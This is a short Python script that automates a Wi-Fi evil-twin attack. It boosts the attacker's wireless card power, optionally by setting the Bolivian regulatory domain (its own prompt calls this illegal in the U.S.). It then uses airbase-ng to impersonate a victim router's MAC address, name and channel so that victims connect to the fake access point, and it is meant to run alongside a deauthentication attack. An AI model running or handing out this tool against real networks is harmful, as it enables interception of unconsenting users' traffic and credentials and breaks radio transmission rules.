#! /usr/bin/env python3
from os import system
from time import sleep
from termcolor import colored

""" The author is Hao Wu,
    If you have any question, Please
    contact hao.wu81@du.edu, it is an academic e-mail.
    Thank You. """


def power_escalation(wireless_card):
    """This function is used to escalate your network card power to ensure your AP will be connected firstly"""
    user_check = input(colored('\nDo you want to use Bolivian wireless power?'
                               '\n Hint: It is illegal in the U.S.Y/N ', 'blue'))
    if user_check == 'Y':
        system('ifconfig {0} down'.format(wireless_card))
        system('iw reg set BO')
        system('iwconfig {0} txpower 30'.format(wireless_card))
        system('ifconfig {0} up'.format(wireless_card))
    elif user_check == 'N':
        system('ifconfig {0} down'.format(wireless_card))
        system('iwconfig {0} txpower 27'.format(wireless_card))
        system('ifconfig {0} up'.format(wireless_card))
    system('iwconfig')
    set_power = input(colored('\nDouble check your wireless card power, is it work well? Y/N ', 'blue'))
    if set_power == 'N':
        print(colored('\nPlease choose lower power and close the Bolivian regulatory!', 'red'))
        power_escalation(wireless_card)
    elif set_power == 'Y':
        print(colored('\nYour power escalation is all set!', 'green'))


def create_evil_twin(wireless_card):
    """This function is used to create a fake AP which is used to let victim connect us"""
    BSSID = input(colored('\nPlease enter victim router MAC address(BSSID): ', 'blue'))
    ESSID = input(colored('\nPlease enter victim router name(ESSID): ', 'blue'))
    CH = input(colored('\nPlease enter victim router running channel(CH): ', 'blue'))
    print(colored('\nYour evil_twin will be created! Enter ctrl+c to exit','green'))
    sleep(5)
    system('airbase-ng -a {0} --essid {1} -c {2} {3}'.format(BSSID, ESSID, CH, wireless_card))


def main():
    """Main is just main function"""
    print(colored('\nPlease use this script before deauth attack running!', 'red'))
    sleep(5)
    system('iwconfig')
    wireless_card = input(colored('\nPlease enter your wireless card name: ', 'blue'))
    card_set = input(colored('\nDo you need power escalation or Your card has this function?'
                             ' Y/N '))
    if card_set == 'Y':
        power_escalation(wireless_card)
    create_evil_twin(wireless_card)


if __name__ == '__main__':
    main()
